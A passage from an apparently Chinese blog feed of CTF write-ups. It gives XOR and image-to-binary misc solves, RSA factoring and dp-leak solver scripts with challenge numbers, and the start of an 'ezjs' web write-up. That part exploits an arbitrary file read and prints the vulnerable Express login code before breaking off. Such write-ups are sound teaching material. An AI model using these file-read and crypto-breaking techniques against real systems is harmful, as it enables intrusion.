105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97&#125;;  size_t size &#x3D; 0x2E00;  for ( j &#x3D; 0; j &lt; (int)size; ++j )    data[j] ^&#x3D; key[j % 10];  v4 &#x3D; fopen(&quot;daidai&quot;, &quot;wb+&quot;);  fwrite(data, size, 1u, v4);  return 0;&#125;</code></pre><p>得到的文件是一个 Word 6.0 文件，打开后提示<br>My friend, I said, there is really no flag here, why don’t you believe me?</p><p>找到字符串 ，发现附近比较可疑</p><p>对全部内容进行xor，可找到完整flag</p><h3 id="鸣雏恋"><a href="#鸣雏恋" class="headerlink" title="鸣雏恋"></a>鸣雏恋</h3><p>binwalk提取doc文件，有一个压缩包，找到key里面有线索，是零宽字节，解出密码。</p><p>压缩包还有一个压缩包，用密码解压得十二万个图片，可以猜想为二进制即01或者黑白，用脚本转换为了二进制得flag。</p><pre class="language-python" data-language="python"><code class="language-python">white <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\0.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>black <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\1.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#注意要填文件真实的地址</span>flag <span class="token operator">=</span> <span class="token string">''</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">129488</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    color <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\%d.png'</span><span class="token operator">%</span>i<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>color <span class="token operator">==</span> white<span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token string">'0'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token string">'1'</span><span class="token comment">#把二进制数转为字符串</span>ans <span class="token operator">=</span> <span class="token string">''</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span></code></pre><p>输出得二进制字符串</p><p>转字符串</p><p>根据提示，base64转hex，另存为png</p><p>得到flag</p><h3 id="ChieftainsSecret"><a href="#ChieftainsSecret" class="headerlink" title="ChieftainsSecret"></a>ChieftainsSecret</h3><p>binwalk 出一个压缩包</p><p>得到一张图片和一个csv TLE5501角度传感器，可以看到接口的对应关系通过 pc1-pc2 pc3-pc4  算出具体角度最后通过角度偏移得到打电话的数字</p><p>77085962457</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="myRSA"><a href="#myRSA" class="headerlink" title="myRSA"></a>myRSA</h3><p>等了一年终于连上了远程，直接拿flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">109291726712521562723217799066595465738514008562793813124735859077003607567378308344900227726005943523435691922275823930699185558905584992475684350943587216218159563567105178716429607251904576481331913955542279314418005710062312937628773101937560276030946008602896333498620895794065652328753887107382421236463</span><span class="token comment"># 发送b'\x01'的数据</span>m1 <span class="token operator">=</span> <span class="token number">9525397945159597083139236796554389057349388348561320860497256507608704178409073111423041648854415731502829246163813817887013295691211115103559158067048812940460342194773168560663306267552081548022969259450140126995928980812391022443278295051940120607312916391873625551459919069565401135463687861822761080960205441980160935262098587017605666572800848834634719283023350989003155672616785656418280486284252404327230995895334350449329496820373234495050858491300214136</span>flag <span class="token operator">=</span> <span class="token number">84714851061101551104842512208187516497690941059475723791750410942286241438698723551108297972855709502813510704312734246065654513821412192005193874395178433209848447807820345594430525933303605443157096791247595647420106894826618667916444279408290598367546651937728210043377385005880582654352783857030860269528710293017844982383988131043975713555798776601699577367436001411779466011751454954293920819863328114688953193568821221654373376635664655139419988801273771425680451278262871578890722408740436473781164730132065673797985283333324587469932990362283302547046173192527601753522974618089085155465973571933897481911626440582347862648387324192155488169555320343590638542052353093371100231443955010712018714258942911513526907631585015690345636535765895659959658571378505136</span>t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m1<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment"># print(t)</span><span class="token keyword">while</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>t<span class="token operator">*</span>t<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> t<span class="token operator">-</span><span class="token number">1</span>t2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>t<span class="token operator">*</span>t<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>t<span class="token operator">+</span>t2<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>q <span class="token operator">=</span> n<span class="token operator">//</span>px <span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>q <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">+</span> q<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> y <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">*</span>q <span class="token operator">+</span> p <span class="token operator">+</span> qc <span class="token operator">=</span> <span class="token punctuation">(</span>flag<span class="token operator">//</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="/article/2021xyb/1629541706(1).png" class="" title="1629541706(1)" loading="lazy"><h3 id="Random-RSA"><a href="#Random-RSA" class="headerlink" title="Random_RSA"></a>Random_RSA</h3><p>懒得开虚拟机，python2没有密码库，所以上面是用python2跑出来的dp，下面解密用的python3。</p><p>ps:这个题好像必须得用python2跑dp，py3的MT算法似乎参数有点不同，跑出来的数据也不同。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># import random</span><span class="token comment"># import binascii</span><span class="token comment"># import os</span><span class="token comment"># tmp = [[58, 53, 122], [145, 124, 244], [5, 19, 192], [255, 23, 64], [57, 113, 194], [246, 205, 162], [112, 87, 95], [215, 147, 105], [16, 131, 38], [234, 36, 46], [68, 61, 146], [148, 61, 9], [139, 77, 32], [96, 56, 160], [121, 76, 17], [114, 246, 92], [178, 206, 60], [168, 147, 26], [168, 41, 68], [24, 93, 84], [175, 43, 88], [147, 97, 153], [42, 94, 45], [150, 103, 127], [68, 163, 62], [165, 37, 89], [219, 248, 59], [241, 182, 8], [140, 211, 146], [88, 226, 2], [48, 150, 56], [87, 109, 255], [227, 216, 65], [23, 190, 10], [5, 25, 64], [6, 12, 124], [53, 113, 124], [255, 192, 158], [61, 239, 5], [62, 108, 86], [123, 44, 64], [195, 192, 30], [30, 82, 95], [56, 178, 165], [68, 77, 239], [106, 247, 226], [17, 46, 114], [91, 71, 156], [157, 43, 182], [146, 6, 42], [148, 143, 161], [108, 33, 139], [139, 169, 157], [71, 140, 25], [28, 153, 26], [241, 221, 235], [28, 131, 141], [159, 111, 184], [47, 206, 11], [220, 152, 157], [41, 213, 97], [4, 220, 10], [77, 13, 248], [94, 140, 110], [25, 250, 226], [218, 102, 109], [189, 238, 66], [91, 18, 131], [23, 239, 190], [159, 33, 72], [183, 78, 208], [209, 213, 101], [111, 50, 220], [166, 104, 233], [170, 144, 10], [187, 87, 175], [195, 59, 104], [165, 179, 179], [99, 247, 153], [195, 61, 100], [223, 159, 165], [230, 93, 184], [87, 28, 35], [35, 122, 38], [158, 188, 163], [229, 192, 222], [12, 12, 192], [207, 95, 224], [127, 113, 137], [22, 114, 143], [13, 45, 144], [70, 140, 211], [57, 101, 42], [132, 62, 129], [40, 128, 124], [1, 132, 161], [164, 33, 133], [252, 201, 32], [8, 18, 247], [1, 88, 55], [201, 135, 186], [101, 254, 125], [236, 196, 39], [148, 24, 103], [101, 29, 253], [97, 156, 64], [90, 103, 91], [50, 48, 80], [206, 22, 93], [11, 114, 174], [61, 132, 247], [215, 32, 232], [95, 128, 90], [57, 35, 228], [163, 143, 107], [178, 250, 28], [64, 107, 225], [106, 115, 207], [85, 134, 21], [118, 201, 76], [234, 34, 22], [241, 236, 122], [111, 185, 127], [1, 26, 164], [254, 57, 117], [243, 27, 32], [161, 88, 80], [50, 165, 93], [87, 182, 216], [184, 159, 63], [167, 166, 123], [37, 78, 33], [186, 81, 58], [48, 3, 239], [70, 186, 13], [56, 108, 178], [54, 55, 235], [105, 180, 105], [16, 194, 98], [136, 11, 41], [18, 203, 79], [185, 114, 170], [148, 181, 223], [118, 57, 160], [23, 250, 181], [235, 219, 228], [44, 151, 38], [185, 224, 134], [42, 162, 122], [3, 9, 158], [129, 245, 2], [66, 241, 92], [80, 124, 36]]</span><span class="token comment"># res = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]</span><span class="token comment"># seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]</span><span class="token comment"># dp = bytearray()</span><span class="token comment"># for i in range(0, len(seeds)):</span><span class="token comment">#     random.seed(seeds[i])</span><span class="token comment">#     rands = []</span><span class="token comment">#     for j in range(0,4):</span><span class="token comment">#         rands.append(random.randint(0,255))</span><span class="token comment">#     print(str(rands))</span><span class="token comment">#     dp.append(res[i] ^ rands[i%4])</span><span class="token comment"># print(dp)</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2dp <span class="token operator">=</span> <span class="token number">5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    _ <span class="token operator">=</span> dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> _ <span class="token operator">%</span> i<span class="token punctuation">:</span>            p <span class="token operator">=</span> _ <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> n <span class="token operator">%</span> p<span class="token punctuation">:</span>                q <span class="token operator">=</span> n <span class="token operator">//</span> p                phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> dn<span class="token operator">=</span><span class="token number">81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span>ct<span class="token operator">=</span><span class="token number">61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>e<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="/article/2021xyb/1.png" class="" width="1" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021巅峰极客一道题——ezjs</title>
      <link href="article/2021dfjk/"/>
      <url>article/2021dfjk/</url>
      
        <content type="html"><![CDATA[<p>深入学习一下JavaScript的原型链污染漏洞</p><a id="more"></a><p>我是巅峰fw，就摸出来一道题目，好好学习下原型链污染。以下为做题视角。</p><h2 id="Web-ezjs"><a href="#Web-ezjs" class="headerlink" title="Web-ezjs"></a>Web-ezjs</h2><h3 id="第一步-任意文件读取"><a href="#第一步-任意文件读取" class="headerlink" title="第一步 - 任意文件读取"></a>第一步 - 任意文件读取</h3><p>打开题目发现非常简洁的登陆，以为是sql注入，随便输入以下发现直接进入了。</p><p>登陆限制username和password大于5位</p><img src="/article/2021dfjk/image-20210803151950579.png" class="" title="image-20210803151950579" loading="lazy"><p>图片显示这块明显有异常，对应GET请求的newing参数</p><img src="/article/2021dfjk/image-20210803142727224.png" class="" title="image-20210803142727224" loading="lazy"><h4 id="存在任意文件读取"><a href="#存在任意文件读取" class="headerlink" title="存在任意文件读取"></a>存在任意文件读取</h4><img src="/article/2021dfjk/image-20210803142841282.png" class="" title="image-20210803142841282" loading="lazy"><p>利用此处读取了部分源码如下</p><p><code>/app/routes/index.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token punctuation">&#123;</span>body<span class="token punctuation">,</span> validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> validator <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>validator<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">"登录界面"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>  <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'admin password error'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>msg<span class="token operator">:</span> <span class="token string">'plz input your username and password'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'login first plz'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    req<span class="token 